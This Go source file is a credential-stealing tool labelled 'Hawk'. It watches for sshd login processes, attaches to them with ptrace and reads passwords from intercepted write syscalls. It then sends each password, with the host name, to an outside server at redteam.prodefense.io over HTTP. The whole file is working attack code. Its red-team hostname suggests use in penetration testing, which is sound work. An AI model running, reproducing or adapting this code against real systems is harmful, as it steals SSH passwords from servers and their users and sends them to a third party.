package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

func find_pids() []int {
	var sshd_pids []int

	// Obtain the current process ID
	currentPID := os.Getpid()

	// Read the /proc directory to get a list of process directories
	procDirs, err := ioutil.ReadDir("/proc")
	if err != nil {
		fmt.Println("Error reading /proc:", err)
		return nil
	}

	// Iterate through the process directories and extract PIDs
	for _, dir := range procDirs {
		if dir.IsDir() {
			pid, err := strconv.Atoi(dir.Name())
			if err == nil && pid != currentPID {
				sshd_pids = append(sshd_pids, pid)
			}
		}
	}

	return sshd_pids
}

func isSSHDProcess(pid int) bool {
	cmdline, err := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
	if err != nil {
		return false
	}
	return regexp.MustCompile(`sshd: ([a-zA-Z]+) \[net\]`).MatchString(strings.ReplaceAll(string(cmdline), "\x00", " "))
}

func traceProcess(pid int) {
	fmt.Printf("[Hawk] SSH Connection Identified on pid: %d.\n", pid)

	err := syscall.PtraceAttach(pid)
	if err != nil {
		return
	}
	defer func() {
		syscall.PtraceDetach(pid)
		fmt.Printf("[Hawk] Detached from pid: %d.\n", pid)
	}()

	var wstatus syscall.WaitStatus
	for {

		_, err := syscall.Wait4(pid, &wstatus, 0, nil)
		if err != nil {
			return
		}

		if wstatus.Exited() {
			return
		}

		if wstatus.StopSignal() == syscall.SIGTRAP {
			var regs syscall.PtraceRegs
			err := syscall.PtraceGetRegs(pid, &regs)
			if err != nil {
				fmt.Println("PtraceGetRegs:", err)
				syscall.PtraceDetach(pid)
				return
			}
			// Find some way to only find it once
			if regs.Rdi == 5 && regs.Orig_rax == 1 {
				buffer := make([]byte, regs.Rdx)
				_, err := syscall.PtracePeekData(pid, uintptr(regs.Rsi), buffer)
				if err != nil {
					fmt.Println("Error reading buffer:", err)
					return
				}
				if len(buffer) < 250 && len(buffer) > 5 && string(buffer) != "" {
					// Fix weird hex shit with buffer "\x00\x00\x00\x04test"
					var password = string(buffer)
					valid := regexp.MustCompile(`\x00\x00\x00[^\n]*\f$`).MatchString(password)
					if !valid {
						fmt.Printf("password: %s\n", password)
						go sendBufferToServer("root", password)
						fmt.Printf("finished \n")
					}
				} else {
					fmt.Printf("rdi: %d, rax: %d\n", regs.Rdi, regs.Orig_rax)
				}
			}
		}

		err = syscall.PtraceSyscall(pid, 0)
		if err != nil {
			return
		}
	}
}

func sendBufferToServer(username, password string) {
	hostname, err := os.Hostname()
	if err != nil {
		return
	}
	serverURL := "http://redteam.prodefense.io:6969/"
	values := url.Values{}
	values.Set("hostname", hostname)
	values.Set("username", username)
	values.Set("password", password)
	fullURL := fmt.Sprintf("%s?%s", serverURL, values.Encode())

	http.Get(fullURL)
}

func main() {
	var processedFirstPID bool
	var processed_pids []int
	var processedPIDsMutex sync.Mutex

	for {
		sshdPids := find_pids()
		for _, pid := range sshdPids {
			processedPIDsMutex.Lock()
			if isSSHDProcess(pid) && (!processedFirstPID || !contains(processed_pids, pid)) {
				if !processedFirstPID {
					fmt.Println("SSHD first PID:", pid)
					processedFirstPID = true
				} else {
					fmt.Println("SSHD process found with PID:", pid)
					go traceProcess(pid)
					processed_pids = append(processed_pids, pid)
				}
			}
			processedPIDsMutex.Unlock()
		}
		time.Sleep(1 * time.Second)
	}
}
func contains(slice []int, value int) bool {
	for _, v := range slice {
		if v == value {
			return true
		}
	}
	return false
}
